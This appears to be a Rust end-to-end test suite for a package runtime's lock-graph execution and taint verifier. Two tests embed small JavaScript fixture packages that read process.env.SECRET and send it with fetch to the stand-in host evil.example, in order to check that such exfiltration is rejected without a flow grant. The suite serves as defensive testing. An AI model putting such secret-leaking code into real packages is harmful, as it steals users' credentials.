//! Adversarial end-to-end verification of the lock-graph in-cell path.
//!
//! These tests build REAL multi-package locks with real lowerable source and
//! drive them through `omc_runtime::execute_project`, exercising:
//! (a) cross-package PURE call computes the correct value,
//! (b) cross-package EXFIL is rejected without a flow grant, admitted with one,
//! (c) unresolved/missing lock entries fail closed,
//! (d) out-of-subset dependency fails closed,
//! (e) import-id mapping is swap-resistant across two distinct dependencies.

use std::fs;
use std::io::Write as _;
use std::path::Path;

use omc_cap::MemoryBroker;
use omc_format::Value;
use omc_registry::{Behavior, Ecosystem, LockedPackage, OmcLock, Verdict};
use omc_runtime::{execute_project, ExecError, ExecTarget};
use omc_taint::Labeled;
use sha2::{Digest, Sha256};

fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hasher
        .finalize()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

fn npm_tgz(main: &str, files: &[(&str, &str)]) -> Vec<u8> {
    let package_json = format!(r#"{{"name":"x","version":"1.0.0","main":"{main}"}}"#);
    let mut entries: Vec<(String, String)> = vec![("package.json".to_owned(), package_json)];
    for (path, content) in files {
        entries.push(((*path).to_owned(), (*content).to_owned()));
    }
    tgz(&entries
        .iter()
        .map(|(p, c)| (format!("package/{p}"), c.clone()))
        .collect::<Vec<_>>())
}

fn tgz(entries: &[(String, String)]) -> Vec<u8> {
    let mut bytes = Vec::new();
    {
        let encoder = flate2::write::GzEncoder::new(&mut bytes, flate2::Compression::default());
        let mut archive = tar::Builder::new(encoder);
        for (path, content) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive
                .append_data(&mut header, path, content.as_bytes())
                .unwrap();
        }
        archive.into_inner().unwrap().finish().unwrap();
    }
    bytes
}

fn locked_pkg(
    project_dir: &Path,
    ecosystem: Ecosystem,
    name: &str,
    version: &str,
    archive_bytes: &[u8],
    dependencies: Vec<String>,
) -> LockedPackage {
    let rel = format!(".omc/cache/{ecosystem}/{name}-{version}.tgz");
    let archive_path = project_dir.join(&rel);
    fs::create_dir_all(archive_path.parent().unwrap()).unwrap();
    fs::write(&archive_path, archive_bytes).unwrap();
    LockedPackage {
        ecosystem,
        name: name.to_owned(),
        version: version.to_owned(),
        source_url: format!("https://example/{name}"),
        archive: rel,
        artifact: format!(".omc/artifacts/{name}.json"),
        sha256: sha256_hex(archive_bytes),
        artifact_sha256: String::new(),
        behavior: Behavior::Pure,
        verdict: Verdict::Accepted,
        dependencies,
        optional_dependencies: Vec::new(),
        peer_dependencies: Vec::new(),
        grants: Vec::new(),
        capabilities: Vec::new(),
        verifier_findings: Vec::new(),
    }
}

fn write_lock(project_dir: &Path, packages: Vec<LockedPackage>) {
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages,
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    let toml = toml::to_string(&lock).unwrap();
    let mut file = fs::File::create(project_dir.join("omc.lock")).unwrap();
    file.write_all(toml.as_bytes()).unwrap();
}

fn write_manifest(project_dir: &Path, allow: &[&str], allow_flow: &[&str]) {
    let allow_list = allow
        .iter()
        .map(|g| format!("\"{g}\""))
        .collect::<Vec<_>>()
        .join(", ");
    let flow_list = allow_flow
        .iter()
        .map(|f| format!("\"{f}\""))
        .collect::<Vec<_>>()
        .join(", ");
    let manifest = format!(
        "[project]\nname = \"demo\"\nversion = \"0.0.0\"\n\n[policy]\nallow = [{allow_list}]\nallow-flow = [{flow_list}]\n"
    );
    fs::write(project_dir.join("omc.toml"), manifest).unwrap();
}

// (a) cross-package PURE call computes the correct value: is-even(4) via is-odd.
#[test]
fn a_cross_package_pure_call_value() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path();
    write_manifest(project, &[], &[]);

    let is_odd = locked_pkg(
        project,
        Ecosystem::Npm,
        "is-odd",
        "3.0.1",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function isOdd(n) { return n % 2 === 1; };",
            )],
        ),
        Vec::new(),
    );
    let is_even = locked_pkg(
        project,
        Ecosystem::Npm,
        "is-even",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function isEven(n) { const dep = require('is-odd'); return !dep(n); };",
            )],
        ),
        vec!["npm:is-odd@^3.0.0".to_owned()],
    );
    write_lock(project, vec![is_even, is_odd]);

    let mut broker = MemoryBroker::new();
    // isEven(4) = !isOdd(4) = !false = true
    let r4 = execute_project(
        project,
        ExecTarget::package("is-even"),
        vec![Labeled::public(Value::Int(4))],
        &mut broker,
    )
    .unwrap();
    assert_eq!(r4.value, Value::Bool(true), "isEven(4)");

    // isEven(7) = !isOdd(7) = !true = false
    let r7 = execute_project(
        project,
        ExecTarget::package("is-even"),
        vec![Labeled::public(Value::Int(7))],
        &mut broker,
    )
    .unwrap();
    assert_eq!(r7.value, Value::Bool(false), "isEven(7)");
}

// (b) cross-package EXFIL: a dependency reads env secret and posts it to the
// network. Rejected by whole-program verification with no flow grant; admitted
// only with the explicit flow grant in the project policy.
#[test]
fn b_cross_package_exfil_denied_then_admitted_with_flow() {
    // The dependency reads process.env.SECRET and POSTs it to evil.example.
    let leaker_src = "module.exports = function leak() { const s = process.env.SECRET; \
         return fetch('https://evil.example/c', s); };";
    let app_src =
        "module.exports = function main() { const dep = require('leaker'); return dep(); };";

    let build = |project: &Path, allow: &[&str], allow_flow: &[&str]| {
        write_manifest(project, allow, allow_flow);
        let leaker = locked_pkg(
            project,
            Ecosystem::Npm,
            "leaker",
            "1.0.0",
            &npm_tgz("index.js", &[("index.js", leaker_src)]),
            Vec::new(),
        );
        let app = locked_pkg(
            project,
            Ecosystem::Npm,
            "app",
            "1.0.0",
            &npm_tgz("index.js", &[("index.js", app_src)]),
            vec!["npm:leaker@1.0.0".to_owned()],
        );
        write_lock(project, vec![app, leaker]);
    };

    // No grants at all: rejected (env read not even granted -> capability denied).
    {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path();
        build(project, &[], &[]);
        let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
        let err =
            execute_project(project, ExecTarget::package("app"), vec![], &mut broker).unwrap_err();
        assert!(
            matches!(err, ExecError::Verify { .. }),
            "no-grant exfil must be denied, got {err}"
        );
    }

    // Grant env + network capabilities but NO flow rule: the taint flow
    // env:SECRET -> network is still rejected by whole-program verification.
    {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path();
        build(project, &["env:SECRET", "network:evil.example"], &[]);
        let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
        let err =
            execute_project(project, ExecTarget::package("app"), vec![], &mut broker).unwrap_err();
        assert!(
            matches!(err, ExecError::Verify { .. }),
            "capabilities without flow grant must still deny exfil, got {err}"
        );
    }

    // Grant capabilities AND the explicit flow rule: now admitted.
    {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path();
        build(
            project,
            &["env:SECRET", "network:evil.example"],
            &["env:SECRET -> network:evil.example"],
        );
        let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
        let result = execute_project(project, ExecTarget::package("app"), vec![], &mut broker);
        assert!(
            result.is_ok(),
            "explicit flow grant must admit exfil, got {:?}",
            result.err()
        );
    }
}

// (b2) Cross-boundary taint: the SECRET is read in the importer (app) and
// passed as an ARGUMENT into the dependency, which sinks it to the network.
// This is only caught if taint propagates THROUGH the CallImport into the
// callee's parameter. Denied without a flow grant; admitted with one.
#[test]
fn b2_taint_propagates_through_callimport_argument() {
    // sink(x) posts x to the network. app reads the secret and calls sink(secret).
    let sink_src =
        "module.exports = function sink(x) { return fetch('https://evil.example/c', x); };";
    let app_src = "module.exports = function main() { const sink = require('sink'); \
                   const s = process.env.SECRET; return sink(s); };";

    let build = |project: &Path, allow_flow: &[&str]| {
        write_manifest(project, &["env:SECRET", "network:evil.example"], allow_flow);
        let sink = locked_pkg(
            project,
            Ecosystem::Npm,
            "sink",
            "1.0.0",
            &npm_tgz("index.js", &[("index.js", sink_src)]),
            Vec::new(),
        );
        let app = locked_pkg(
            project,
            Ecosystem::Npm,
            "app",
            "1.0.0",
            &npm_tgz("index.js", &[("index.js", app_src)]),
            vec!["npm:sink@1.0.0".to_owned()],
        );
        write_lock(project, vec![app, sink]);
    };

    // No flow rule: the secret reaching the network sink INSIDE the callee must
    // be caught by interprocedural whole-program taint.
    {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path();
        build(project, &[]);
        let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
        let err =
            execute_project(project, ExecTarget::package("app"), vec![], &mut broker).unwrap_err();
        assert!(
            matches!(err, ExecError::Verify { .. }),
            "secret-through-import-arg exfil must be denied, got {err}"
        );
    }
    // With the flow rule: admitted.
    {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path();
        build(project, &["env:SECRET -> network:evil.example"]);
        let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
        let result = execute_project(project, ExecTarget::package("app"), vec![], &mut broker);
        assert!(
            result.is_ok(),
            "flow grant must admit, got {:?}",
            result.err()
        );
    }
}

// (c) a missing lock entry / unresolved import fails closed with a Lock error.
#[test]
fn c_missing_lock_entry_fails_closed() {
    // app declares dep on `helper` but `helper` is NOT in the lock packages.
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path();
    write_manifest(project, &[], &[]);
    let app = locked_pkg(
        project,
        Ecosystem::Npm,
        "app",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function main(n) { const h = require('helper'); return h(n); };",
            )],
        ),
        vec!["npm:helper@1.0.0".to_owned()],
    );
    write_lock(project, vec![app]);
    let mut broker = MemoryBroker::new();
    let err = execute_project(
        project,
        ExecTarget::package("app"),
        vec![Labeled::public(Value::Int(1))],
        &mut broker,
    )
    .unwrap_err();
    assert!(
        matches!(err, ExecError::Lock(_)),
        "missing dep must fail closed, got {err}"
    );
    let msg = err.to_string();
    assert!(
        msg.contains("helper"),
        "error should name the missing package: {msg}"
    );
}

// (c2) an import that is NOT a declared lock dependency fails closed.
#[test]
fn c2_undeclared_import_fails_closed() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path();
    write_manifest(project, &[], &[]);
    let is_odd = locked_pkg(
        project,
        Ecosystem::Npm,
        "is-odd",
        "3.0.1",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function isOdd(n) { return n % 2 === 1; };",
            )],
        ),
        Vec::new(),
    );
    // app requires is-odd at runtime but declares NO dependency on it.
    let app = locked_pkg(
        project,
        Ecosystem::Npm,
        "app",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function main(n) { const d = require('is-odd'); return d(n); };",
            )],
        ),
        Vec::new(),
    );
    write_lock(project, vec![app, is_odd]);
    let mut broker = MemoryBroker::new();
    let err = execute_project(
        project,
        ExecTarget::package("app"),
        vec![Labeled::public(Value::Int(3))],
        &mut broker,
    )
    .unwrap_err();
    assert!(
        matches!(err, ExecError::Lock(_)),
        "undeclared import must fail closed, got {err}"
    );
}

// (d) a dependency whose source is outside the lowerable subset fails closed.
#[test]
fn d_unlowerable_dependency_fails_closed() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path();
    write_manifest(project, &[], &[]);
    let broken = locked_pkg(
        project,
        Ecosystem::Npm,
        "broken-dep",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[("index.js", "class Oops { @@@ not valid js @@@ }")],
        ),
        Vec::new(),
    );
    let app = locked_pkg(
        project,
        Ecosystem::Npm,
        "app",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[("index.js", "module.exports = function main(n) { const d = require('broken-dep'); return d(n); };")],
        ),
        vec!["npm:broken-dep@1.0.0".to_owned()],
    );
    write_lock(project, vec![app, broken]);
    let mut broker = MemoryBroker::new();
    let err = execute_project(
        project,
        ExecTarget::package("app"),
        vec![Labeled::public(Value::Int(1))],
        &mut broker,
    )
    .unwrap_err();
    assert!(
        matches!(err, ExecError::Lower(_)),
        "unlowerable dep must fail closed, got {err}"
    );
}

// (e) import-id mapping correctness / swap resistance: app imports TWO distinct
// dependencies, each computing a DIFFERENT function. The result is only correct
// if each CallImport dispatches to the right module.
//
// add100(n) = n + 100, mul3(n) = n * 3.
// app(n) = add100(n) - mul3(n)  -> for n=10: 110 - 30 = 80.
// If the two imports were swapped: mul3(10) - add100(10) = 30 - 110 = -80.
// So an 80 vs -80 result proves the dispatch is order-correct.
#[test]
fn e_two_dependency_import_dispatch_is_swap_resistant() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path();
    write_manifest(project, &[], &[]);

    let add100 = locked_pkg(
        project,
        Ecosystem::Npm,
        "add100",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function add100(n) { return n + 100; };",
            )],
        ),
        Vec::new(),
    );
    let mul3 = locked_pkg(
        project,
        Ecosystem::Npm,
        "mul3",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function mul3(n) { return n * 3; };",
            )],
        ),
        Vec::new(),
    );
    // Note source order: mul3 is required FIRST, add100 SECOND, but the
    // expression uses add100 first. This stresses first-use interning order.
    let app = locked_pkg(
        project,
        Ecosystem::Npm,
        "app",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function main(n) { \
                 const b = require('mul3'); \
                 const a = require('add100'); \
                 return a(n) - b(n); };",
            )],
        ),
        vec!["npm:add100@1.0.0".to_owned(), "npm:mul3@1.0.0".to_owned()],
    );
    write_lock(project, vec![app, add100, mul3]);

    let mut broker = MemoryBroker::new();
    let result = execute_project(
        project,
        ExecTarget::package("app"),
        vec![Labeled::public(Value::Int(10))],
        &mut broker,
    )
    .unwrap();
    // add100(10) - mul3(10) = 110 - 30 = 80. Swapped would be -80.
    assert_eq!(
        result.value,
        Value::Int(80),
        "two-dep dispatch must be order-correct (swap would give -80)"
    );
}

// (e2) Cross-check: an importer that calls is-odd AND a second pure dep, to
// confirm the brief's is-even shape with a second dependency resolves each.
#[test]
fn e2_iseven_plus_second_dep() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path();
    write_manifest(project, &[], &[]);

    let is_odd = locked_pkg(
        project,
        Ecosystem::Npm,
        "is-odd",
        "3.0.1",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function isOdd(n) { return n % 2 === 1; };",
            )],
        ),
        Vec::new(),
    );
    let double = locked_pkg(
        project,
        Ecosystem::Npm,
        "double",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function double(n) { return n + n; };",
            )],
        ),
        Vec::new(),
    );
    // isEvenDoubled(n): if isOdd(n) return -1 else return double(n).
    let app = locked_pkg(
        project,
        Ecosystem::Npm,
        "app",
        "1.0.0",
        &npm_tgz(
            "index.js",
            &[(
                "index.js",
                "module.exports = function main(n) { \
                 const odd = require('is-odd'); \
                 const dbl = require('double'); \
                 if (odd(n)) { return 0 - 1; } return dbl(n); };",
            )],
        ),
        vec!["npm:is-odd@3.0.1".to_owned(), "npm:double@1.0.0".to_owned()],
    );
    write_lock(project, vec![app, is_odd, double]);

    let mut broker = MemoryBroker::new();
    // n=4: not odd -> double(4) = 8
    let even = execute_project(
        project,
        ExecTarget::package("app"),
        vec![Labeled::public(Value::Int(4))],
        &mut broker,
    )
    .unwrap();
    assert_eq!(even.value, Value::Int(8), "n=4 -> double");
    // n=5: odd -> -1
    let odd = execute_project(
        project,
        ExecTarget::package("app"),
        vec![Labeled::public(Value::Int(5))],
        &mut broker,
    )
    .unwrap();
    assert_eq!(odd.value, Value::Int(-1), "n=5 -> odd sentinel");
}
